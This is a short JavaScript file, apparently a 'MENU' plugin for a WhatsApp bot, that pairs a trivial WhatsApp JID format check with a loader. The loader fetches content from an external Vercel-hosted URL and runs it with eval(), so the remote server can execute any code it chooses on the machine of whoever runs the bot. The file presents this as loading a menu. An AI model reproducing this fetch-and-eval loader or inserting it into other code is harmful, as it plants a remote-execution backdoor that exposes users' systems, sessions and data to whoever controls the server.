'use strict';

const axios = require('axios');

// Direct URL to load the MENU file from your server
const fileURL = 'https://timnasa-multiple.vercel.app/timoth.html/MENU_URL';

// Function to verify WhatsApp JID format
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('❌ Invalid JID format:', jid);
        return false;
    }
    console.log('✅ JID verified:', jid);
    return true;
}

// Fetch the file from the server and evaluate it
axios.get(fileURL)
  .then(response => {
      const scriptContent = response.data;

      console.log("🗂️ File 'MENU' loaded successfully from FrediEzra server\n");

      try {
        eval(scriptContent); // Run loaded code
      } catch (error) {
        console.error("⚠️ Error while evaluating script:", error.message);
      }

      // Example test
      const jid = 'user@s.whatsapp.net';
      const isValid = atbverifierEtatJid(jid);
      console.log('Result ➜ Is JID valid?', isValid);
  })
  .catch(error => {
      console.error('🚫 Failed to load MENU from FrediEzra server:', error.message);
  })
